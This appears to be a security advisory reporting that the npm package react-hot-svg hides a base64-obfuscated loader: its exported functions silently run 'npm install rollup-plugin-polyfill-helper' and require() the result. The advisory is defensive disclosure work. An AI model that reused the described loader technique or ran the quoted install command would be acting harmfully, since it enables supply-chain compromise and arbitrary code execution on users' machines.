summary: react-hot-svg runs base64-obfuscated npm install and require() of a hidden package on any exported API call
details: The package advertises SVG plugin helpers (getPlugin/setPlugin/validateSvgContent) but each exported function unconditionally decodes a base64-encoded shell command that runs `npm install rollup-plugin-polyfill-helper --no-save --silent --no-audit --no-fund` via spawn, then require()s the freshly installed module under a base64-hidden name and invokes a function on it inside the consumer process. The install command and the required module name are both concealed with atob(base64) literals disguised as svgValidateKey/svgValidatePattern. The fetched package is unpinned, undocumented, and unrelated to the package's stated purpose; whoever controls that name on the npm registry at install time gets arbitrary code execution in the caller's Node.js process. The obfuscation, silent install flags, and mismatch between advertised functionality and actual behavior are consistent with a dependency-confusion / hidden loader.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
